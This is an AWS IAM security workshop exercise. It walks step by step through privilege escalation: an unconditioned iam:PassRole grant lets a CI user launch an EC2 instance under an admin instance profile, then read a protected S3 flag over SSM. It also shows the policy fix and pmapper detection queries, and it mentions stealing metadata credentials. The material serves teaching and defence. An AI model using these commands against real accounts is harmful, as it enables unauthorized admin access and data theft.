## Exercise 5: PassRole + EC2 - New PassRole

**Category:** New PassRole
**Starting AWS identity:** `iamws-ci-runner-user`
**Target:** `iamws-prod-deploy-role` (via EC2 instance)

> [!NOTE]
> **New to EC2 and PassRole?** Here's a quick primer:
> - **EC2 instance** = a virtual machine running in the cloud.
> - **Instance profile** = the mechanism for attaching an IAM role to an EC2 instance. The instance can then retrieve temporary credentials for that role from the [instance metadata service](http://169.254.169.254). This exists so workloads running on your EC2 instances (and other compute in AWS) can use these credentials to access other cloud services like your storage or databases
> - **`iam:PassRole`** = the permission that controls which IAM roles a user can hand off ("pass") to an AWS service. You don't *become* the role — you tell a service like EC2 or Lambda to *use* it. PassRole is the gatekeeper for that handoff.

**The Vulnerability:** The `iamws-ci-runner-user` has `iam:PassRole` intended for Lambda deployments, but the permission is missing the `iam:PassedToService` condition key. Without this condition, PassRole works for *any* AWS service — including EC2.

**Real-world scenario:** A CI/CD pipeline user needs `iam:PassRole` to deploy Lambda functions and has separate EC2 permissions for build infrastructure. Without the `iam:PassedToService` condition, PassRole isn't scoped to Lambda — it works for all services. The attacker exploits this gap by passing a privileged role to EC2 instead.

### Part A: Identify with pmapper

```bash
pmapper query "can user/iamws-ci-runner-user do iam:PassRole with *"
```

Expected output:
```
user/iamws-ci-runner-user IS authorized to call action iam:PassRole for resource *
```

Also check the escalation path:
```bash
pmapper analysis --output-type text | grep -A2 "iamws-ci-runner-user"
```

### Part B: Understand the Attack Category

Visit [pathfinding.cloud EC2-001](https://pathfinding.cloud/paths/ec2-001):

- **Category:** New PassRole
- **Required Permissions:** `iam:PassRole` + `ec2:RunInstances` (unrestricted)
- **Root Cause:** Missing `iam:PassedToService` condition key
- **Impact:** Access to any role that has an instance profile

PassRole attacks are indirect—the attacker doesn't directly become the role, they pass it to a compute service that exposes the credentials.

### Part C: Examine the Vulnerable Policy

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)

aws iam get-policy-version \
  --policy-arn arn:aws:iam::${ACCOUNT_ID}:policy/iamws-ci-runner-policy \
  --version-id v1 \
  --query 'PolicyVersion.Document' \
  --output json
```

Notice the PassRole statement has `Resource: "*"` but **no Condition block**. Since this user's PassRole is intended for Lambda deployments, the missing condition is:
```json
"Condition": {
  "StringEquals": {
    "iam:PassedToService": "lambda.amazonaws.com"
  }
}
```

With this condition, PassRole would only work when handing a role to Lambda — the EC2 attack path would be completely blocked.

### Part D: Exploit the Vulnerability

**Step 1: Try to access the crown jewels**

```bash
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text \
  --profile iamws-ci-runner-user)

aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt - \
  --profile iamws-ci-runner-user
```

**Expected:** `Forbidden` — this CI runner can't reach the crown jewels... yet.

**Step 2: Identify the target instance profile**

From the pmapper analysis in Part A, you already know that `iamws-ci-runner-user` can reach the admin role `iamws-prod-deploy-role` via EC2. In AWS, instance profiles share the same name as their role by convention — and in this lab the instance profile is named `iamws-prod-deploy-profile`. This is the profile we'll attach to our EC2 instance.

> [!NOTE]
> In a real attack, the attacker might enumerate instance profiles using actions like `aws iam list-instance-profiles`. The CI runner doesn't have that IAM read permission, but they don't need it — `ec2:RunInstances` with `iam:PassRole` is enough to attach any role's instance profile at launch time, even without knowing the full list upfront. An attacker who already identified the target role (via recon tools like pmapper) just needs to guess or know the instance profile name.

**Step 3: Find a suitable AMI and subnet**

We need an Amazon Linux 2 AMI (which has the SSM agent pre-installed) and a subnet to launch into:

```bash
# Get the latest Amazon Linux 2 AMI
AMI_ID=$(aws ec2 describe-images \
  --owners amazon \
  --filters "Name=name,Values=amzn2-ami-hvm-*-x86_64-gp2" \
            "Name=state,Values=available" \
  --query 'Images | sort_by(@, &CreationDate) | [-1].ImageId' \
  --output text \
  --profile iamws-ci-runner-user)

echo "AMI: $AMI_ID"

# Get the default VPC's first subnet
SUBNET_ID=$(aws ec2 describe-subnets \
  --filters "Name=default-for-az,Values=true" \
  --query 'Subnets[0].SubnetId' \
  --output text \
  --profile iamws-ci-runner-user)

echo "Subnet: $SUBNET_ID"
```

**Step 4: Launch EC2 with the privileged instance profile**

This is the vulnerability proven — unrestricted `iam:PassRole` allows attaching an admin role to a new EC2:

```bash
INSTANCE_ID=$(aws ec2 run-instances \
  --image-id $AMI_ID \
  --instance-type t2.micro \
  --iam-instance-profile Name=iamws-prod-deploy-profile \
  --subnet-id $SUBNET_ID \
  --query 'Instances[0].InstanceId' \
  --output text \
  --profile iamws-ci-runner-user)

echo "Launched instance: $INSTANCE_ID"
```

**Step 5: Wait for the instance and SSM agent to come online**

Wait about 90 seconds for the instance to boot and the SSM agent to register. You can check if it's ready with:

```bash
aws ssm describe-instance-information \
  --filters "Key=InstanceIds,Values=$INSTANCE_ID" \
  --query 'InstanceInformationList[0].PingStatus' \
  --output text \
  --profile iamws-ci-runner-user
```

When the output shows `Online`, you're ready for the next step. If it shows `None` or blank, wait a bit and try again.

**Step 6: Start an interactive SSM session and claim the crown jewels**

```bash
aws ssm start-session --target $INSTANCE_ID \
  --profile iamws-ci-runner-user
```

Once inside the session, run the following commands to prove you have admin access via the instance's role:

```bash
# Inside the SSM session:
# Prove admin access
aws sts get-caller-identity

# Grab the crown jewels from inside the EC2 instance
ACCOUNT_ID=$(aws sts get-caller-identity --query Account --output text)
aws s3 cp s3://iamws-crown-jewels-${ACCOUNT_ID}/flag.txt -
```

You should see the caller identity shows `iamws-prod-deploy-role` and the crown jewels file contents — you now have full admin access from inside the EC2 instance.

> [!NOTE]
> We're running commands interactively via SSM for demonstration, but a real attacker wouldn't stop here. They could exfiltrate the instance role's temporary credentials (via the metadata service at `169.254.169.254`), use them from any machine, create a new IAM user for persistent access, or pivot further into the account — all without ever logging into the instance.

**Step 7: Exit the session**
```bash
exit
```

### What You Learned

- **iam:PassRole** controls which roles can be handed off to AWS services like EC2 and Lambda
- The missing `iam:PassedToService` condition is the root cause — PassRole was intended for Lambda, but without the condition it worked for EC2 too
- Unrestricted PassRole + compute permissions = credential access to any role with an instance profile

---

**Next:** [Exercise 6: UpdateFunctionCode](exercise-6.md) — Privilege escalation via existing PassRole
